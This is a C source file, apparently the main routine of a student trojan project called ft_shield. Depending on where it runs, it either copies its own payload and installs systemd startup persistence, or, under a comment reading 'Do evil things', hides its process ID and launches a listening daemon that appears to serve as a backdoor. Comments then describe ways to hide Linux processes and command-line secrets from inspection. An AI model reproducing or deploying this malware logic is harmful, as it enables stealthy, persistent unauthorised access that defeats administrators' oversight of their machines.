#include "../includes/ft_shield.h"

// Check PATH where it is executed
// ANSWER: readlink to retrive full path of the executable
// https://stackoverflow.com/questions/933850/how-do-i-find-the-location-of-the-executable-in-c
int main ( void )
{
    char buf[1024];
    // check where is it executed
    int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    buf[i] = '\0';
    if (strcmp(buf, EXECUTABLE_FILE)) {
        printf("robrodri & jalvarad.\n");
        copy_payload();
        // systems without systemctl will not work
        startup_setup();
    }
    else { // Do evil things
        hide_pid();
        t_daemon *daemon = create_daemon();
        server_listen(daemon);
        free(daemon);
    }
    return (EXIT_SUCCESS);
}

// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/

// Hidepid option: Remount the /proc filesystem with the hidepid option. This will hide processes from other users, but not from root. The option value determines which processes are hidden:
// hidepid=1: Hide processes from all users except the owner.
// hidepid=2: Hide processes from all users except the owner and the same user group.
// hidepid=4: Hide processes from all users except the owner and the same user group, and also hide the process ID.
// Example: mount -o remount,hidepid=2 /proc

// Mounting an empty directory: Mount an empty directory inside /proc/ to hide a specific process. This method is “dirty” and may have unintended consequences.
// Example: mount -o bind /empty/dir /proc/42

// Namespaces: Use Linux namespaces (e.g., pam_namespace) to create a separate mount namespace for the target user. This allows you to mount /proc with hidepid only for that user.
// Command-line argument hiding: On Linux, you can limit the exposure of sensitive data (like passwords) on the command line by not including it in the first 4096 bytes of the command. This is because older Linux versions truncate /proc//cmdline to 4096 bytes. You can use techniques like padding the command line with spaces or using a wrapper script to achieve this.
// Example (using zsh): ${(l:4094::/:):-myapplication} --smtp-password=secret
